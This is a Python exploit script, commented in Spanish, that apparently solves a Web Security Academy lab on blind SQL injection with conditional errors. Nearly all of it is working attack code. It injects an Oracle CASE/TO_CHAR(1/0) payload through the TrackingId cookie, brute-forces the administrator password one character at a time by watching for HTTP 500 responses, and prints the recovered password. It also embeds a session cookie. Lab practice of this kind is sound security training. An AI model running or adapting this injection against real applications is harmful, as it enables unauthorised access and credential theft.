#!/usr/bin/env python3
# Lab: Blind SQL injection with conditional errors
# Objetivo: Extraer la contraseña del administrador forzando errores 500 en la base de datos Oracle

from pwn import *
import requests
import signal
import sys
import string
import time

# Manejo de interrupción (Ctrl+C)
def def_handler(sig, frame):
    p1.failure("Ataque de fuerza bruta detenido")
    print(f"\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Configuración de caracteres y progreso
characters = string.ascii_lowercase + string.digits
target_url = "https://0aed008604509bf28095581100aa00eb.web-security-academy.net"
p1 = log.progress("SQLI")

def makeSQLI():
    p1.status("Iniciando ataque de fuerza bruta")
    time.sleep(2)
    password = ""
    p2 = log.progress("Password")

    # Iteración sobre los 20 caracteres de la contraseña
    for position in range(1, 21):
        for character in characters:
            # Payload de Oracle: Si el carácter es correcto, ejecuta to_char(1/0) provocando un Error 500
            cookies = {
                "TrackingId": f"xyz'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{character}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
                "session": "eeBj0F3YK4uowytrMt8WtFXH7U4GcRVo"
            }

            p1.status(f"Posición {position} - Probando: {character}")
            r = requests.get(target_url, cookies=cookies)

            # En SQLi basado en errores, el código 500 confirma que la condición es VERDADERA
            if r.status_code == 500:
                password += character
                p2.status(password)
                break

    p1.success("Ataque completado con éxito")
    print(f"[+] Contraseña obtenida: {password}")

if __name__ == '__main__':
    makeSQLI()
